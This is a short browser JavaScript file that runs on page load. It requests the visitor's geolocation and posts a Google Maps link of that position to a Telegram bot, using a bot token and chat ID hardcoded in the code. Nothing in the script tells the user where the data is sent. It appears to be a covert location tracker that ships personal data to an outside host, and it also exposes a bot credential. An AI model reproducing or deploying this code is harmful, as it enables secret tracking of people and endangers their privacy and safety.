function getLocation() {
    return new Promise((resolve, reject) => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude } = position.coords;
            resolve({ latitude, longitude });
          },
          (error) => {
            reject(error);
          }
        );
      } else {
        reject(new Error("Geolocation is not supported by this browser."));
      }
    });
  }
  async function sendLocationToTelegram(latitude, longitude) {
    const botToken = "7822829606:AAGsqwfuyMJdsorw_VWQEhZvsxy9dNDBN1M";
    const chatId = "7044052806";
    // Generate a Google Maps link for the location
    const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
    const text = `User's location:\n[View on Google Maps](${googleMapsLink})`;
  
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
      chat_id: chatId,
      text: text,
      parse_mode: "Markdown", // Use Markdown to make the link clickable
    };
  
    try {
      const response = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });
  
      if (!response.ok) {
        throw new Error("Failed to send location to Telegram");
      }
  
      console.log("Location link sent successfully!");
    } catch (error) {
      console.error(error);
    }
  }
  async function sendUserLocationToTelegramBot() {
    try {
      const location = await getLocation();
      await sendLocationToTelegram(location.latitude, location.longitude);
    } catch (error) {
      console.error("Error getting or sending location:", error);
    }
  }
  
  // Call this function to start the process
  sendUserLocationToTelegramBot();
  